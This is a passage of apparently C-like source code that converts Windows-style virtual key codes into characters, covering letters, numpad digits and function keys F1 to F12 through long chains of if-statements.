				result="n";}

			if(scancode==79){
				result="o";}

			if(scancode==80){
				result="p";}

			if(scancode==81){
				result="q";}

			if(scancode==82){
				result="r";}

			if(scancode==83){
				result="s";}

			if(scancode==84){
				result="t";}

			if(scancode==85){
				result="u";}

			if(scancode==86){
				result="v";}

			if(scancode==87){
				result="w";}

			if(scancode==88){
				result="x";}

			if(scancode==89){
				result="y";}

			if(scancode==90){
				result="z";}

			if(scancode==126){
				result="~";}

			found=1;
		}

		if(scancode>=96&&scancode<=105)
		{
			if(scancode==96){
				result="0";}

			if(scancode==97){
				result="1";}

			if(scancode==98){
				result="2";}

			if(scancode==99){
				result="3";}

			if(scancode==100){
				result="4";}

			if(scancode==101){
				result="5";}

			if(scancode==102){
				result="6";}

			if(scancode==103){
				result="7";}

			if(scancode==104){
				result="8";}

			if(scancode==105){
				result="9";}
			found=1;   
		}
		//96-105: <numpad>0-9

		if(scancode>=112&&scancode<=123)
		{
			if(scancode==112){
				result="<F1>";}

			if(scancode==113){
				result="<F2>";}

			if(scancode==114){
				result="<F3>";}

			if(scancode==115){
				result="<F4>";}

			if(scancode==116){
				result="<F5>";}

			if(scancode==117){
				result="<F6>";}

			if(scancode==118){
				result="<F7>";}

			if(scancode==119){
				result="<F8>";}

			if(scancode==120){
				result="<F9>";}

			if(scancode==121){
				result="<F10>";}

			if(scancode==122){
				result="<F11>";}

			if(scancode==123){
				result="<F12>";}

			found=1;

		}   

		if(scancode==221)
		{
			result="]";
			found=1;
		}
		//it wont work as a case statement
		if(!found)
		{
			result="";
		}
		break;

	}
	return result;

}